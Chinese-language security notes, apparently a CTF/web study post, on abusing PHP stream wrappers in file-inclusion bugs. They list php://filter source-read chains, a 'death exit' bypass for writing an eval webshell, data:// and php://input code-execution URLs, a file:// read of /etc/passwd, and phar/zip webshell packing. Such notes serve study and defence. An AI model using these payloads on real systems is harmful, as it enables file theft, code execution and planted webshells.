# PHP伪协议


&gt; 参考文章：[PHP伪协议详解](https://blog.csdn.net/cosmoslin/article/details/120695429)
## php支持的伪协议
```
1 file:// — 访问本地文件系统
2 http:// — 访问 HTTP(s) 网址
3 ftp:// — 访问 FTP(s) URLs
4 php:// — 访问各个输入/输出流（I/O streams）
5 zlib:// — 压缩流
6 data:// — 数据（RFC 2397）
7 glob:// — 查找匹配的文件路径模式
8 phar:// — PHP 归档
9 ssh2:// — Secure Shell 2
10 rar:// — RAR
11 ogg:// — 音频流
12 expect:// — 处理交互式的流
```
## php://filter
php://filter可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致 任意文件读取。
```
//协议参数
resource=&lt;要过滤的数据流&gt;	这个参数是必须的。它指定了你要筛选过滤的数据流。
read=&lt;读链的筛选列表&gt;	该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。
write=&lt;写链的筛选列表&gt;	该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。
&lt;；两个链的筛选列表&gt;	任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。
```
### 常用payload：
```
php://filter/read=convert.base64-encode/resource=index.php
php://filter/resource=index.php
data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=
```
### 过滤器
1. 字符串过滤器
（1）string.rot13：一种字符处理方式，字符右移十三位。
（2）string.toupper：将所有字符转换为大写。
（3）string.tolower：将所有字符转换为小写。
（4）string.strip_tags：用来处理掉读入的所有标签，例如XML的等等。**在绕过死亡exit大有用处**。
2. 转换过滤器
（1）convert.base64-encode &amp; convert.base64-decode
base64加密解密
（2）convert.quoted-printable-encode &amp; convert.quoted-printable-decode
可以翻译为可打印字符引用编码，使用可以打印的ASCII编码的字符表示各种编码形式下的字符
3. 压缩过滤器
压缩过滤器指的并不是在数据流传入的时候对整个数据进行写入文件后压缩文件，也不代表可以压缩或者解压数据流。
压缩过滤器不产生命令行工具如 gzip的头和尾信息。**只是压缩和解压数据流中的有效载荷部分。**
（1）zlib.deflate（压缩）or bzip2.compress
（2）zlib.inflate（解压）or bzip2.decompress
4. 加密过滤器
```mcrypt.*```和``` mdecrypt.*```使用 libmcrypt 提供了对称的加密和解密。

### 利用filter伪协议绕过死亡exit
死亡exit指的是在进行写入PHP文件操作时，执行了以下函数：
```
file_put_contents($content, &#39;&lt;?php exit();&#39; . $content);
file_put_contents($content, &#39;&lt;?php exit();?&gt;&#39; . $content);
```
插入木马以后也无法使用
```
&lt;?php exit();?&gt;

&lt;?php @eval($_POST[&#39;snakin&#39;]);?&gt;
```
死亡exit源码：
```
&lt;?php
$content = &#39;&lt;?php exit; ?&gt;&#39;;
$content .= $_POST[&#39;txt&#39;];
file_put_contents($_POST[&#39;filename&#39;], $content);
```
* base64decode绕过
当用户通过POST方式提交一个数据时，会与死亡exit进行拼接，从而避免提交的数据被执行。
然而这里可以利用php://filter的base64-decode方法，将$content解码，利用php base64_decode函数特性去除死亡exit。
```
&lt;?php

$_GET[&#39;txt&#39;] = preg_replace(&#39;|[^a-z0-9A-Z&#43;/]|s&#39;, &#39;&#39;, $_GET[&#39;txt&#39;]);

base64_decode($_GET[&#39;txt&#39;]);
```
这个时候后面再加上编码后的一句话木马，就可以getshell了。

* strip_tags绕过
这个```&lt;?php exit; ?&gt;```实际上是一个XML标签，既然是XML标签，我们就可以利用strip_tags函数去除它，而php://filter刚好是支持这个方法的。
但是我们要写入的一句话木马也是XML标签，在用到strip_tags时也会被去除。
注意到在写入文件的时候，filter是支持多个过滤器的。
**可以先将webshell经过base64编码，strip_tags去除死亡exit之后，再通过base64-decode复原。**
payload：
```
php://filter/string.strip_tags|convert.base64-decode/resource=shell.php
```

## data://
数据流封装器，以传递相应格式的数据。可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。
例：
```
data://text/plain,
http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;
 
data://text/plain;base64,
http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
```
* Example 1【打印 data:// 的内容】
```
&lt;?php
// 打印 &#34;I love PHP&#34;
echo  file_get_contents ( &#39;data://text/plain;base64,SSBsb3ZlIFBIUAo=&#39; );
?&gt;
```
* Example 2【获取媒体类型】
```
&lt;?php
$fp    =  fopen ( &#39;data://text/plain;base64,&#39; ,  &#39;r&#39; );
$meta  =  stream_get_meta_data ( $fp );

// 打印 &#34;text/plain&#34;
echo  $meta [ &#39;mediatype&#39; ];
?&gt;
```

## file://
用于访问本地文件系统，并且不受allow_url_fopen，allow_url_include影响
file://协议主要用于访问**文件(绝对路径、相对路径以及网络路径)**
例：
```
http://www.xx.com?file=file:///etc/passsword
```

## php://
在allow_url_fopen，allow_url_include都关闭的情况下可以正常使用
**php://作用为访问输入输出流**


## php://input
php://input可以访问请求的原始数据的只读流，**将post请求的数据当作php代码执行**。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。
```
例如：
http://127.0.0.1/cmd.php?cmd=php://input
POST数据：&lt;?php phpinfo()?&gt;
注意：当enctype=&#34;multipart/form-data&#34;的时候 php://input是无效的
```
**遇到file_get_contents()要想到用php://input绕过。**

## zip://
zip:// 可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行。
**zip://中只能传入绝对路径。**
要用#分隔压缩包和压缩包里的内容，并且#要用url编码%23（即下述POC中#要用%23替换）
只需要是zip的压缩包即可，后缀名可以任意更改。
相同的类型的还有zlib://和bzip2://
例：
```
zip://[压缩包绝对路径]#[压缩包内文件]?file=zip://D:\zip.jpg%23phpinfo.txt
```


## phar://伪协议
是php解压缩报的一个函数，不管后缀是什么，都会当做压缩包来解压。

用法：
```
?file=phar://压缩包/内部文件 phar://xxx.png/shell.php
```
注： PHP&gt;=5.3.0压缩包需要是zip协议压缩，rar不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。

步骤：写一个一句话木马shell。php，然后用zip协议解压缩为shell.zip。然后将后缀改为png等其他格式


---

> Author: [Ting](Tin10g.github.io)  
> URL: http://localhost:1313/posts/2023web-php%E4%BC%AA%E5%8D%8F%E8%AE%AE/  

